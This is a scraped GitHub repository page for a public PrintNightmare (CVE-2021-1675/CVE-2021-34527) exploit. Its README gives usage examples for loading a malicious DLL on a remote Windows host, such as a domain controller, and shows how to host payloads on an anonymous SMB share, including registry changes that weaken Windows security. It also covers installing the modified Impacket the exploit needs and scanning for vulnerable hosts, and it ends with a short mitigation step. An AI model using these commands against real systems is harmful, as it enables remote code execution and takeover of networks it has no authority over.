
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=cube0x0%2FCVE-2021-1675)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cube0x0](/cube0x0)
/
**[CVE-2021-1675](/cube0x0/CVE-2021-1675)**
Public

* [Notifications](/login?return_to=%2Fcube0x0%2FCVE-2021-1675) You must be signed in to change notification settings
* [Fork
  584](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)
* [Star
   1.9k](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)

C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527

[1.9k
stars](/cube0x0/CVE-2021-1675/stargazers) [584
forks](/cube0x0/CVE-2021-1675/forks) [Branches](/cube0x0/CVE-2021-1675/branches) [Tags](/cube0x0/CVE-2021-1675/tags) [Activity](/cube0x0/CVE-2021-1675/activity)
 [Star](/login?return_to=%2Fcube0x0%2FCVE-2021-1675)

 [Notifications](/login?return_to=%2Fcube0x0%2FCVE-2021-1675) You must be signed in to change notification settings

* [Code](/cube0x0/CVE-2021-1675)
* [Issues
  36](/cube0x0/CVE-2021-1675/issues)
* [Pull requests
  2](/cube0x0/CVE-2021-1675/pulls)
* [Actions](/cube0x0/CVE-2021-1675/actions)
* [Projects
  0](/cube0x0/CVE-2021-1675/projects)
* [Security](/cube0x0/CVE-2021-1675/security)
* [Insights](/cube0x0/CVE-2021-1675/pulse)

Additional navigation options

* [Code](/cube0x0/CVE-2021-1675)
* [Issues](/cube0x0/CVE-2021-1675/issues)
* [Pull requests](/cube0x0/CVE-2021-1675/pulls)
* [Actions](/cube0x0/CVE-2021-1675/actions)
* [Projects](/cube0x0/CVE-2021-1675/projects)
* [Security](/cube0x0/CVE-2021-1675/security)
* [Insights](/cube0x0/CVE-2021-1675/pulse)

# cube0x0/CVE-2021-1675

    main[Branches](/cube0x0/CVE-2021-1675/branches)[Tags](/cube0x0/CVE-2021-1675/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[26 Commits](/cube0x0/CVE-2021-1675/commits/main/) | | |
| [Images](/cube0x0/CVE-2021-1675/tree/main/Images "Images") | | [Images](/cube0x0/CVE-2021-1675/tree/main/Images "Images") |  |  |
| [SharpPrintNightmare](/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare "SharpPrintNightmare") | | [SharpPrintNightmare](/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare "SharpPrintNightmare") |  |  |
| [CVE-2021-1675.py](/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py "CVE-2021-1675.py") | | [CVE-2021-1675.py](/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py "CVE-2021-1675.py") |  |  |
| [README.md](/cube0x0/CVE-2021-1675/blob/main/README.md "README.md") | | [README.md](/cube0x0/CVE-2021-1675/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2021-1675 / CVE-2021-34527

Impacket implementation of the [PrintNightmare](https://github.com/afwu/PrintNightmare)  PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)

Tested on a fully patched 2019 Domain Controller

Execute malicious DLL's remote or locally

[![](/cube0x0/CVE-2021-1675/raw/main/Images/poc2.png)](/cube0x0/CVE-2021-1675/blob/main/Images/poc2.png)

### Patch update

Microsoft has released a patch to mitigate against these attacks but if these values below are present on a machine, then the machine will still be vulnerable

```
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1

```

### Installation

Before running the exploit you need to install my version of Impacket and after that you're gucci

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```

### CVE-2021-1675.py

```
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'

```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf`  to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser

```

From windows it's also possible

```
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot

```

### Scanning

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Mitigation

Disable Spooler service

```
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```

## About

C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527

### Resources

[Readme](#readme-ov-file)

[Activity](/cube0x0/CVE-2021-1675/activity)
### Stars

[**1.9k**
stars](/cube0x0/CVE-2021-1675/stargazers)
### Watchers

[**43**
watching](/cube0x0/CVE-2021-1675/watchers)
### Forks

[**584**
forks](/cube0x0/CVE-2021-1675/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fcube0x0%2FCVE-2021-1675&report=cube0x0+%28user%29)

## [Releases](/cube0x0/CVE-2021-1675/releases)

No releases published

## [Packages 0](/users/cube0x0/packages?repo_name=CVE-2021-1675)

No packages published

## Languages

* [C#
  50.8%](/cube0x0/CVE-2021-1675/search?l=c%23)
* [Python
  49.2%](/cube0x0/CVE-2021-1675/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

